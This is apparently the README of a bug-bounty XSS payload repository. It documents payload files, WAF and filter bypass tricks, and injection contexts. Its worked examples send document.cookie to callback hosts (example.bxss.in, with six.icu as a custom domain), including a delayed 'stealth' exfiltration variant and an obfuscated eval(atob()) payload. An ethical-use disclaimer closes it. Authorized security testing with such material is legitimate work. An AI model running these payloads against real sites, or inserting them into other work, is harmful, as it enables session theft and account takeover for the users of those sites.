# XSS Professional Payload Collection

This repository contains a comprehensive and professional collection of XSS payloads for use in bug bounty and security testing. The files were developed with advanced techniques for bypassing and exploiting XSS vulnerabilities.

## Included Files

### 1. `static.js` - Static JavaScript XSS Payload
A complete JavaScript file containing:
- **Basic payloads**: Alert, confirm, prompt
- **Bypass techniques**: Case variation, null bytes, whitespace, comments
- **Event handlers**: Mouse, keyboard, form, media, window events
- **Encoding bypasses**: HTML entities, URL encoding, Unicode, Base64
- **Contextual payloads**: JavaScript, HTML attribute, CSS, URL contexts
- **DOM-based XSS**: Location-based, document methods, eval-based
- **Self-XSS exploitation**: Social engineering, clipboard, console manipulation
- **Advanced techniques**: Template literals, destructuring, proxy objects
- **WAF bypasses**: CloudFlare, ModSecurity, AWS WAF, generic bypasses
- **Browser-specific**: Chrome, Firefox, Safari, IE, Edge
- **XSS Hunter integration**: Callbacks, data exfiltration, stealth payloads
- **Polyglot payloads**: Multi-context exploitation

### 2. `URI-Payloads.txt` - Additional JavaScript Payload URI
A text file with ready-to-use URIs containing:
- **JavaScript protocol URIs**: Direct execution via javascript:
- **Data protocol URIs**: Base64 encoded and plain text
- **HTTP/HTTPS callbacks**: For XSS Hunter and custom domains
- **Advanced bypass URIs**: Unicode, encoding, protocol confusion
- **Context-specific URIs**: href, src, action, CSS, meta refresh
- **WAF bypass URIs**: Specific techniques for different WAFs
- **Browser-specific URIs**: Browser-optimized payloads
- **Polyglot URIs**: Multi-context exploitation
- **Advanced exfiltration**: Complete data, stealth, form data
- **Self-XSS exploitation**: Console, clipboard, social engineering
- **DOM-based XSS**: Location, URL parameters, fragment identifiers

## Domain Configuration

### XSS Hunter Domain (Fixed Content)
```

https://example.bxss.in

```
Use this domain when the XSS Hunter content is already configured and you cannot change it.

### Custom Domain (Changeable Content)
```

https://six.icu

````
Use this domain when you need full control over the payload and callback.

## How to Use

### 1. Using static.js

#### Direct Loading
```html
<script src="static.js"></script>
<script>
// Use a random payload
var payload = XSSPayloads.PayloadGenerator.random(XSSPayloads.BasicPayloads.alert);
console.log(payload);
</script>
````

#### Node.js Import

```javascript
const XSSPayloads = require('./static.js');

// Generate a custom payload
var customPayload = XSSPayloads.PayloadGenerator.xssHunter('document.cookie');
console.log(customPayload);
```

#### Usage Examples

```javascript
// Basic payload
XSSPayloads.BasicPayloads.alert[0] // <script>alert(1)</script>

// Bypass payload
XSSPayloads.BypassPayloads.caseVariation[0] // <ScRiPt>alert(1)</ScRiPt>

// Event handler
XSSPayloads.EventHandlerPayloads.mouse[0] // <img src=x onerror=alert(1)>

// Encoding
XSSPayloads.PayloadGenerator.encoded('<script>alert(1)</script>', 'url')

// XSS Hunter callback
XSSPayloads.PayloadGenerator.xssHunter('document.cookie')
```

### 2\. Using URI-Payloads.txt

#### URL Parameter Injection

```
Original: https://example.com/page?redirect=https://google.com
Payload:  https://example.com/page?redirect=javascript:alert(1)
```

#### HTML Attribute Injection

```html
<a href="javascript:alert(1)">Link</a>

<iframe src="javascript:alert(1)"></iframe>

<form action="javascript:alert(1)">
```

#### CSS Injection

```css
background: url('javascript:alert(1)');
```

#### Meta Refresh

```html
<meta http-equiv="refresh" content="0;url=javascript:alert(1)">
```

## Included Bypass Techniques

### 1\. Filter Bypasses

  - **Case Variation**: ScRiPt, SCRIPT, Script
  - **Null Bytes**: \\x00 injection
  - **Whitespace**: Tab, newline, carriage return
  - **Comments**: /\*\*/, //, - **String Concatenation**: "XS"+"S", String.fromCharCode()

### 2\. Encoding Bypasses

  - **HTML Entities**: \<script\>, \<script\>
  - **URL Encoding**: %3Cscript%3E
  - **Unicode**: \\u003cscript\\u003e
  - **Hex**: \\x3cscript\\x3e
  - **Base64**: PHNjcmlwdD4=

### 3\. WAF Bypasses

  - **CloudFlare**: \<svg/onload=alert(1)\>
  - **ModSecurity**: String.fromCharCode(), atob()
  - **AWS WAF**: alert`1`, (alert)(1)
  - **Generic**: eval(atob()), Function()

### 4\. Context-Specific

  - **JavaScript Context**: alert(1), eval()
  - **HTML Attribute**: " onmouseover="alert(1)
  - **CSS Context**: expression(alert(1))
  - **URL Context**: javascript:alert(1)

## Testing Methodology

### 1\. Context Identification

  - Determine where your input is being reflected
  - Identify the context (HTML, JavaScript, CSS, URL)
  - Choose appropriate payloads for the context

### 2\. Filter Testing

  - Start with basic payloads
  - If blocked, try bypass techniques
  - Use encoding if necessary
  - Test case variations

### 3\. Advanced Exploitation

  - Use polyglot payloads for multiple contexts
  - Implement data exfiltration
  - Set up callbacks for XSS Hunter
  - Test in different browsers

### 4\. Documentation

  - Record which payloads worked
  - Document effective bypass techniques
  - Keep logs of received callbacks

## Practical Examples

### Example 1: Reflected XSS in Search Parameter

```
URL: https://example.com/search?q=<script>alert(1)</script>
Bypass: https://example.com/search?q=<ScRiPt>alert(1)</ScRiPt>
Advanced: https://example.com/search?q=<svg onload=fetch('https://example.bxss.in?'+document.cookie)>
```

### Example 2: DOM XSS via Fragment

```
URL: https://example.com/page#<script>alert(1)</script>
Payload: https://example.com/page#alert(1)
Callback: https://example.com/page#fetch('https://example.bxss.in?'+document.cookie)
```

### Example 3: Stored XSS in Comment

```
Input: <img src=x onerror=alert(1)>
Bypass: <img src=x onerror=eval(atob('YWxlcnQoMSk='))>
Stealth: <img src=x onerror=setTimeout(()=>fetch('https://example.bxss.in?'+document.cookie),5000)>
```

## Security Considerations

### Ethical Use

  - Use only in applications you have permission to test
  - Always obtain written authorization before testing
  - Do not use for malicious activities
  - Respect the terms of bug bounty programs

### Responsibility

  - Report vulnerabilities responsibly
  - Do not cause damage to the tested systems
  - Protect sensitive data discovered during tests
  - Follow responsible disclosure guidelines

### Legal

  - Ensure your tests are legal in your jurisdiction
  - Obtain appropriate contracts for penetration testing
  - Maintain proper documentation of your activities
  - Consult lawyers when necessary

## Troubleshooting

### Payloads Not Working

1.  Check the injection context
2.  Test different encoding techniques
3.  Try case variations
4.  Use browser-specific payloads

### WAF Blocking

1.  Use obfuscation techniques
2.  Try double encoding
3.  Use WAF-specific payloads
4.  Fragment the payload

### Callbacks Not Received

1.  Check the XSS Hunter configuration
2.  Test with a custom domain
3.  Check firewalls and proxies
4.  Use different callback methods

## Additional Resources

### Recommended Tools

  - **XSS Hunter**: https://xsshunter.trufflesecurity.com or https://bxsshunter.com
  - **Burp Suite**: For interception and modification
  - **OWASP ZAP**: Vulnerability scanner
  - **Browser Developer Tools**: For debugging

### References

  - **OWASP XSS Prevention Cheat Sheet**
  - **OWASP XSS Filter Evasion Cheat Sheet**
  - **PortSwigger Web Security Academy**
  - **HackerOne Disclosure Guidelines**

### Community

  - **Bug Bounty Forums**: For discussion of techniques
  - **Security Conferences**: For continuous learning
  - **CTF Competitions**: For skill practice
  - **Security Blogs**: For updates on techniques

## Updates

This repository is kept up-to-date with the latest XSS and bypass techniques. Check regularly for:

  - New payloads
  - Updated bypass techniques
  - Bug fixes
  - Performance improvements

## Contributions

To contribute new payloads or techniques:

1.  Test the payloads thoroughly
2.  Document the context of use
3.  Include bypass techniques where applicable
4.  Keep the code clean and commented

## License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

-----

**Disclaimer**: This material is intended only for security professionals and ethical hackers. Malicious use of these payloads is strictly prohibited and may result in legal consequences.
